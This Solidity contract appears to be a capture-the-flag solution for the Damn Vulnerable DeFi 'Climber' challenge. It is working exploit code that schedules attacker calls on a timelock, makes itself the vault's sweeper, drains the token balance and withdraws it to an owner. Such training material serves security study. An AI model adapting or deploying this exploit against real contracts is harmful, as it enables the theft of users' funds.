// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../DamnValuableToken.sol";
import "./AttackVault.sol";
import "../../contracts/climber/ClimberTimelock.sol";

contract AttackTimelock {
    address vault;
    address payable timelock;
    address token;

    address owner;

    bytes[] private scheduleData;
    address[] private to;

    constructor(address _vault, address payable _timelock, address _token, address _owner){
        vault = _vault;
        timelock = _timelock;
        token = _token;
        owner = _owner;
    }

    function setScheduleData(address[] memory _to, bytes[] memory _data) external {
        //"scheduleData" is the function that needs to be executed
        to = _to;
        scheduleData = _data;
    }

    function exploit() external {
        uint256[] memory emptyData = new uint256[](to.length);
        //push the proposal to the ClimberTimelock.sol contract
        ClimberTimelock(timelock).schedule(to, emptyData, scheduleData, 0);

        //Set the "sweeper" to the malicious contract address
        AttackVault(vault).setSweeper(address(this));

        //Sweep the funds
        AttackVault(vault).sweepFunds(token);

     }

    function withdraw() external {
        require(msg.sender == owner, "!Owner");
        DamnValuableToken(token).transfer(owner, DamnValuableToken(token).balanceOf(address(this)));
    }

}